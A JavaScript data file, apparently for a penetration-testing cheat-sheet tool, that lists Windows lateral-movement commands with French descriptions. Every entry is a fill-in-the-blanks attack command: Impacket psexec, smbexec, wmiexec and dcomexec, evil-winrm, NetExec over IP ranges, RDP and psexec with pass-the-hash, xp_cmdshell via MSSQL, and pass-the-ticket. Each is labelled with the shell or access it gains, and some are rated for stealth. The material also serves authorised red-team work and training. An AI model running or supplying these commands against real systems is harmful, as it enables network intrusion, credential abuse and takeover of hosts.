export const LATERAL_MOVE_DATA = [
  {
    name: 'SMB & RPC (Impacket)',
    nodes: [
      { 
        label: 'PsExec (Service)', 
        cmd: 'psexec.py <domain>/<user>:<password>@<target_ip>', 
        leadsTo: 'SYSTEM Shell',
        description: 'Téléverse un binaire de service aléatoire sur le partage ADMIN$, le démarre, puis l\'arrête. Bruyant mais efficace.'
      },
      { 
        label: 'SmbExec (Native)', 
        cmd: 'smbexec.py <domain>/<user>:<password>@<target_ip>', 
        leadsTo: 'System Shell',
        description: 'N\'utilise pas de binaire. Crée un service .bat qui écrit la sortie de la commande dans un fichier temporaire. Plus discret que PsExec.'
      },
      { 
        label: 'AtExec (Task Scheduler)', 
        cmd: 'atexec.py <domain>/<user>:<password>@<target_ip> "whoami"', 
        leadsTo: 'Command Exec',
        description: 'Utilise le planificateur de tâches pour exécuter une commande. Nécessite les droits d\'admin local.'
      }
    ]
  },
  {
    name: 'WMI & DCOM',
    nodes: [
      { 
        label: 'WmiExec (WMI)', 
        cmd: 'wmiexec.py <domain>/<user>:<password>@<target_ip>', 
        leadsTo: 'Semi-Interactive Shell',
        description: 'Exécute des commandes via DCOM (port 135) et récupère la sortie via SMB (445). Très furtif et couramment utilisé.'
      },
      { 
        label: 'DcomExec (DCOM)', 
        cmd: 'dcomexec.py <domain>/<user>:<password>@<target_ip> -object MMC20', 
        leadsTo: 'Command Exec',
        description: 'Abuse des objets DCOM (MMC20, ShellWindows) pour l\'exécution latérale. Utile si WMI est bloqué.'
      }
    ]
  },
  {
    name: 'WinRM (PowerShell)',
    nodes: [
      { 
        label: 'Evil-WinRM', 
        cmd: 'evil-winrm -i <target_ip> -u <user> -p <password>', 
        leadsTo: 'PowerShell Session',
        description: 'Outil de référence pour le mouvement latéral via WinRM (ports 5985/5986). Permet le chargement de scripts en mémoire.'
      },
      { 
        label: 'NetExec WinRM', 
        cmd: 'nxc winrm <ip_range> -u <user> -p <password> -x "whoami"', 
        leadsTo: 'Command Exec',
        description: 'Vérifie si WinRM est activé et exécute une commande sur une plage d\'hôtes.'
      }
    ]
  },
  {
    name: 'RDP (Remote Desktop)',
    nodes: [
      { 
        label: 'xFreerdp', 
        cmd: 'xfreerdp /v:<target_ip> /u:<user> /p:<password> /cert:ignore /dynamic-resolution', 
        leadsTo: 'GUI Access',
        description: 'Connexion RDP standard depuis Linux. L\'option /pth peut être utilisée pour le Pass-The-Hash.'
      },
      { 
        label: 'RDP with Restricted Admin', 
        cmd: 'xfreerdp /v:<target_ip> /u:<user> /pth:<nt_hash> /restricted-admin', 
        leadsTo: 'GUI Access (PTH)',
        description: 'Mode "Restricted Admin" permettant de s\'authentifier via Pass-The-Hash sans exposer ses propres crédentiels sur la machine cible.'
      }
    ]
  },
  {
    name: 'MSSQL (Databases)',
    nodes: [
      { 
        label: 'MssqlClient (xp_cmdshell)', 
        cmd: 'mssqlclient.py <domain>/<user>:<password>@<target_ip> -windows-auth', 
        leadsTo: 'CmdExec',
        description: 'Se connecte à une instance SQL. Si l\'utilisateur est admin, active xp_cmdshell pour exécuter des commandes OS.'
      }
    ]
  },
  {
    name: 'Pass-The-Hash / Ticket',
    nodes: [
      { 
        label: 'Pass-The-Hash (NTHash)', 
        cmd: 'psexec.py -hashes :<nt_hash> <user>@<target_ip>', 
        leadsTo: 'System Shell',
        description: 'Utilise le hash NT directement au lieu du mot de passe (fonctionne avec la plupart des scripts Impacket).'
      },
      { 
        label: 'Pass-The-Ticket (CCACHE)', 
        cmd: 'export KRB5CCNAME=/path/to/ticket.ccache; psexec.py -k -no-pass <domain>/<user>@<target_fqdn>', 
        leadsTo: 'System Shell',
        description: 'Utilise un ticket Kerberos (TGT ou TGS) stocké dans une variable d\'environnement pour s\'authentifier sans mot de passe ni hash.'
      }
    ]
  }
];